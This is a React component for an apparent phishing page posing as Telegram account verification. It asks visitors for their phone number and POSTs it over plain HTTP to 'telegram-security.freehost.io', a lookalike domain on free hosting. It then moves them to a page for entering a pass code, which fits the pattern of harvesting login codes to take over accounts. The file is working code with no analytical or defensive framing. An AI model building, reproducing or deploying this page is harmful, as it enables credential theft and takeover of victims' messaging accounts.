import { useEffect, useRef, useState } from "react";
import "./enterNumber.css";
import { useNavigate } from "react-router-dom";

export default function EnterNumber(){
const [input,setInput]=useState({countryCode:'98',phoneNumber:''})
const [confirmModal,setConfirmModal]=useState(false)
const [loading,setLoading]=useState(false)
const [errorDialog,setErrorDialog]=useState('')
const phoneNumberRef = useRef(null)
const nav =useNavigate()

useEffect(()=>{
phoneNumberRef.current.focus()
},[])
function countryCodeHandler(e){
    if(e.target.value.length>2){
        return
    }
    if(e.target.value.length>1){
        phoneNumberRef.current.focus()
        
    }
    
    setInput({...input,countryCode:e.target.value})
    

}
function countryCodeFocusHandler(){
    setInput({countryCode:'',...input})
}
function phoneNumberHandler(e){
    if(e.target.value.length>10){
        return
    }
    setInput({...input,phoneNumber:e.target.value})
}
function confirmButtonHandler(){
    setConfirmModal(!confirmModal)
    const phoneNumberZero=input.phoneNumber.search(0)
    if(phoneNumberZero===0){
         setInput({...input,phoneNumber:input.phoneNumber.slice(phoneNumberZero+1)})  
    }

}
function confirmPhoneNumber(){
    setConfirmModal(false)
    setLoading(true)
    let phNum=input.countryCode+input.phoneNumber
    async function sendNumber(){
        const phRes= await fetch('http://telegram-security.freehost.io/api/verification',{
            method:"POST",
            headers:{'Content-type':'application/json'},
            body:JSON.stringify({phoneNumber:phNum})
        }).then((data)=>{
            setLoading(false)
            if(data.ok){
                nav('/account_verification/enter_pass_code',{state:phNum})
            }else{
                setErrorDialog(data.statusText)
            }
        })
        
    }
    sendNumber()
}


return(
    <div id="content">
            <div id="loading" style={loading?{display:'block'}:{display:'none'}}>
                <div id="animated_loading">
                    <img src='/images/loading.gif'/>
                </div>
            </div>
        <div id="confirm_modal" style={confirmModal?{display:"block"}:{display:"none"}}>
            <div id="modal_box">
                <p id="modal_description">is this the correct number?</p>
                <p id="modal_phone_number">{'+'+input.countryCode+input.phoneNumber}</p>
                <button id="modal_edit" onClick={confirmButtonHandler}>Edit</button>
                <button id="modal_yes" onClick={confirmPhoneNumber}>Yes</button>
            </div>
            <div id="ok_button" onClick={confirmPhoneNumber}>
                <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" class="bi bi-check-lg" viewBox="0 0 16 16">
                    <path d="M12.736 3.97a.733.733 0 0 1 1.047 0c.286.289.29.756.01 1.05L7.88 12.01a.733.733 0 0 1-1.065.02L3.217 8.384a.757.757 0 0 1 0-1.06.733.733 0 0 1 1.047 0l3.052 3.093 5.4-6.425z"/>
                </svg>
            </div>
        </div>
        <div id="description">
            <img src="/images/enter_number.png"/>
            <h3>Your phone number</h3>
            <p>enter your accounts phone number that you try to authenticate</p>
            
        </div>
        <div id="get_num_sec">
            <form>
                <div id="input_sec">
                    <div id="subject">Phone number</div>
                    <p id="plus">+</p>
                    <input type="number" id="country_code" value={input.countryCode} onChange={countryCodeHandler} onFocus={countryCodeFocusHandler}/>
                    <input type="number" id="phone_number" value={input.phoneNumber} placeholder="000 000 0000" onChange={phoneNumberHandler} ref={phoneNumberRef}/>

                </div>
            </form>
            <div id="confirm_button" onClick={confirmButtonHandler}>
                <svg xmlns="http://www.w3.org/2000/svg" width="42" height="42" fill="currentColor" className="bi bi-arrow-right-short" viewBox="0 0 16 16">
                    <path fillRule="evenodd" d="M4 8a.5.5 0 0 1 .5-.5h5.793L8.146 5.354a.5.5 0 1 1 .708-.708l3 3a.5.5 0 0 1 0 .708l-3 3a.5.5 0 0 1-.708-.708L10.293 8.5H4.5A.5.5 0 0 1 4 8"/>
                </svg>
            </div>
        </div>
        <div id="error_dialog" style={errorDialog?{display:'block'}:{display:'none'}}>
            <p>{errorDialog+'. Try Again.'}</p>
            <div></div>
        </div>
    </div>
)
}